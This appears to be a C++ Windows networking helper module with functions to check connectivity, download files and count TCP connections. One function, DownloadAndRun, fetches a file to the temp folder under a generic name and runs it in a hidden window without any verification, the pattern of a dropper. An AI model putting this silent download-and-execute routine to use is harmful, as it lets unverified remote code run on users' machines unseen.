#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <wininet.h>
#include <urlmon.h>
#include <iphlpapi.h>
#include <tcpmib.h>
#include <strsafe.h>
#include <vector>

#include "internet.h"

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "iphlpapi.lib")

namespace Internet
{

bool IsOnline()
{
	DWORD flags = 0;
	return InternetGetConnectedState(&flags, 0) ? true : false;
}

bool DownloadFile(const wchar_t* url, const wchar_t* destPath)
{
	DeleteFileW(destPath); // clear stale leftovers

	const HRESULT hr = URLDownloadToFileW(nullptr, url, destPath, 0, nullptr);
	if (FAILED(hr))
		return false;

	return GetFileAttributesW(destPath) != INVALID_FILE_ATTRIBUTES;
}

static bool BaseName(const wchar_t* url, wchar_t* out, int cch)
{
	const wchar_t* base = url;
	for (const wchar_t* p = url; *p; ++p)
	{
		if (*p == L'/' || *p == L'\\')
			base = p + 1;
	}

	if (!*base)
		return false;

	StringCchCopyW(out, cch, base);
	return true;
}

bool DownloadToFolder(const wchar_t* url, const wchar_t* folder)
{
	wchar_t name[MAX_PATH];
	if (!BaseName(url, name, MAX_PATH))
		return false;

	wchar_t path[MAX_PATH];
	StringCchPrintfW(path, MAX_PATH, L"%s\\%s", folder, name);
	return DownloadFile(url, path);
}

bool DownloadToTemp(const wchar_t* url, const wchar_t* fileName,
	wchar_t* outPath, int outCch)
{
	wchar_t tmp[MAX_PATH];
	if (!GetTempPathW(MAX_PATH, tmp))
		return false;

	wchar_t path[MAX_PATH];
	StringCchPrintfW(path, MAX_PATH, L"%s%s", tmp, fileName);

	if (outPath && outCch > 0)
		StringCchCopyW(outPath, outCch, path);

	return DownloadFile(url, path);
}

int CountEstablishedConnections()
{
	DWORD size = 0;
	if (GetTcpTable(nullptr, &size, FALSE) != ERROR_INSUFFICIENT_BUFFER
		|| size == 0)
		return 0;

	std::vector<BYTE> buf(size);

	if (GetTcpTable(
			reinterpret_cast<PMIB_TCPTABLE>(buf.data()), &size, FALSE)
		!= NO_ERROR)
		return 0;

	const PMIB_TCPTABLE table = reinterpret_cast<PMIB_TCPTABLE>(buf.data());
	int count = 0;

	for (DWORD i = 0; i < table->dwNumEntries; ++i)
	{
		if (table->table[i].dwState == MIB_TCP_STATE_ESTAB)
			++count;
	}

	return count;
}

bool DownloadAndRun(const wchar_t* url, const wchar_t* args)
{
	wchar_t path[MAX_PATH];
	if (!DownloadToTemp(url, L"hppd_download.bin", path, MAX_PATH))
		return false;

	wchar_t cmd[MAX_PATH + 512];

	STARTUPINFOW si{};
	si.cb = sizeof(si);

	PROCESS_INFORMATION pi{};

	BOOL ok = FALSE;
	if (args && *args)
	{
		StringCchPrintfW(cmd, MAX_PATH + 512, L"\"%s\" %s", path, args);
		ok = CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
			CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
	}
	else
	{
		StringCchPrintfW(cmd, MAX_PATH + 512, L"\"%s\"", path);
		ok = CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
			CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
	}

	if (!ok)
		return false;

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return true;
}

} // namespace Internet